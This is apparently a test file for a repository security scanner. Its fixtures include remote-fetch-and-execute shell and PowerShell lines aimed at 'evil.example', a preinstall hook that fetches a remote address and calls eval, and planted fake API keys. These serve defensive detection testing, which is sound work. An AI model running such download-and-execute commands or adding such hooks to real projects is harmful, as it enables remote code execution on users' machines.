import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { readFile, readdir, stat } from "node:fs/promises";
import { join, relative } from "node:path";
import { tmpdir } from "node:os";
import * as domain from "../../../lib/domain/security-scan.js";
import { findSecrets } from "../../../lib/redact.js";
import { createSecurityScanAdapter } from "../../../lib/infra/security-scan.js";

let pass = 0;
let fail = 0;
function check(name, actual, expected) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  if (ok) pass++;
  else {
    fail++;
    console.log(`FAIL ${name}: got ${JSON.stringify(actual)}, want ${JSON.stringify(expected)}`);
  }
}

const root = mkdtempSync(join(tmpdir(), "dsh-security-scan-"));
const fetchCalls = [];
const adapter = createSecurityScanAdapter({
  fs: { readFile, readdir, stat },
  path: { joinPath: join, relativePath: relative },
  findSecrets,
  fetchImpl: async (url, options) => {
    fetchCalls.push({ url, options });
    const body = JSON.parse(String(options.body));
    return {
      ok: true,
      status: 200,
      body: null,
      arrayBuffer: async () => Buffer.from(JSON.stringify(body.bad
        ? { bad: [{ severity: "critical", title: "Prototype pollution", vulnerable_versions: "<2.0.0", url: "https://example.test/advisory" }] }
        : {})),
    };
  },
  readBodyLimited: async (response) => Buffer.from(await response.arrayBuffer()),
  timeoutSignal: () => "temporary-scan-signal",
  domain: {
    extractEnvNames: domain.extractEnvNames,
    findHostShadowDeps: domain.findHostShadowDeps,
    classifyScriptHazards: domain.classifyScriptHazards,
    lifecycleScriptTargets: domain.lifecycleScriptTargets,
    classifyLifecycleHazards: domain.classifyLifecycleHazards,
    parseLockfileVersions: domain.parseLockfileVersions,
    readVulnScanDeps: domain.readVulnScanDeps,
    filterVulnerabilityHits: domain.filterVulnerabilityHits,
    isSecretScanFile: domain.isSecretScanFile,
    isSecretScanSkipDir: domain.isSecretScanSkipDir,
  },
  limits: {
    secretMaxFiles: domain.SECRET_SCAN_MAX_FILES,
    secretMaxFileBytes: domain.SECRET_SCAN_MAX_FILE_BYTES,
    cveMaxQueries: domain.CVE_MAX_QUERIES,
  },
});

try {
  const repo = join(root, "repo");
  mkdirSync(join(repo, "scripts"), { recursive: true });
  mkdirSync(join(repo, "node_modules", "ignored"), { recursive: true });
  mkdirSync(join(repo, "vendor"), { recursive: true });
  writeFileSync(join(repo, "install.sh"), "curl https://evil.example/install.sh | sh\n", "utf8");
  writeFileSync(join(repo, "install.ps1"), "IEX (IWR https://evil.example/payload)\n", "utf8");
  writeFileSync(join(repo, ".env"), `API_KEY=${["sk-", "AbCd1234EfGh5678IjKl90Mn"].join("")}\n`, "utf8");
  writeFileSync(join(repo, "vendor", "leak.js"), `TOKEN=${["sk-", "AbCd1234EfGh5678IjKl90Mn"].join("")}\n`, "utf8");
  writeFileSync(join(repo, "node_modules", "ignored", "leak.js"), `TOKEN=${["sk-", "AbCd1234EfGh5678IjKl90Mn"].join("")}\n`, "utf8");
  writeFileSync(join(repo, "scripts", "setup.js"), "fetch('https://evil.example'); eval('x')\n", "utf8");
  writeFileSync(join(repo, "package.json"), JSON.stringify({
    name: "security-fixture",
    version: "1.0.0",
    dependencies: { bad: "2.0.0", "@deepseek-ai/dsh-tools": "1.0.0" },
    scripts: { preinstall: "node scripts/setup.js" },
  }), "utf8");
  writeFileSync(join(repo, "package-lock.json"), JSON.stringify({ packages: {
    "": { name: "security-fixture" },
    "node_modules/bad": { version: "2.0.0" },
  }}), "utf8");

  const scriptHits = await adapter.scanScriptHazards(join(repo, "install.sh"));
  check("真实 bash 文件命中下载执行", scriptHits.map((hit) => [hit.category, hit.severity]), [["downloadExec", "critical"]]);
  check("真实 PowerShell 文件命中下载执行", (await adapter.scanScriptHazards(join(repo, "install.ps1")))[0]?.id, "iex-iwr");
  check("真实 lifecycle 读取命中本地 JS", (await adapter.scanLifecycleHazards(repo)).map((hit) => hit.id), ["remote-eval"]);
  check("真实 secrets 只扫受支持文件且跳过目录", (await adapter.scanCacheSecrets(repo)).map((hit) => hit.file), [".env", ".env"]);
  check("真实 host shadow 依赖命中", await adapter.scanHostShadowDeps(repo), ["@deepseek-ai/dsh-tools"]);

  const vulnHits = await adapter.scanCacheVulnerabilities(repo);
  check("真实 package/lock 接入 advisory 命中", vulnHits.map((hit) => [hit.name, hit.version, hit.severity]), [["bad", "2.0.0", "critical"]]);
  check("advisory 请求 payload/headers/signal", [
    JSON.parse(fetchCalls[0].options.body),
    fetchCalls[0].options.headers["Content-Type"],
    fetchCalls[0].options.signal,
  ], [{ bad: ["2.0.0"], "@deepseek-ai/dsh-tools": ["1.0.0"] }, "application/json", "temporary-scan-signal"]);

  const clean = join(root, "clean");
  mkdirSync(clean, { recursive: true });
  writeFileSync(join(clean, "README.md"), "ordinary documentation\n", "utf8");
  check("真实干净仓库扫描为空", [
    (await adapter.scanScriptHazards(join(clean, "README.md"))).length,
    (await adapter.scanCacheSecrets(clean)).length,
    (await adapter.scanCacheVulnerabilities(clean)).length,
  ], [0, 0, 0]);

  const failedNetwork = createSecurityScanAdapter({
    fs: { readFile, readdir, stat },
    path: { joinPath: join, relativePath: relative },
    findSecrets,
    fetchImpl: async () => { throw new Error("network down"); },
    readBodyLimited: async () => Buffer.from("{}"),
    timeoutSignal: () => "signal",
    domain: {
      extractEnvNames: domain.extractEnvNames,
      findHostShadowDeps: domain.findHostShadowDeps,
      classifyScriptHazards: domain.classifyScriptHazards,
      lifecycleScriptTargets: domain.lifecycleScriptTargets,
      classifyLifecycleHazards: domain.classifyLifecycleHazards,
      parseLockfileVersions: domain.parseLockfileVersions,
      readVulnScanDeps: domain.readVulnScanDeps,
      filterVulnerabilityHits: domain.filterVulnerabilityHits,
      isSecretScanFile: domain.isSecretScanFile,
      isSecretScanSkipDir: domain.isSecretScanSkipDir,
    },
    limits: { secretMaxFiles: 200, secretMaxFileBytes: 512 * 1024, cveMaxQueries: 100 },
  });
  check("真实目录网络失败静默降级", await failedNetwork.scanCacheVulnerabilities(repo), []);
} finally {
  rmSync(root, { recursive: true, force: true });
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
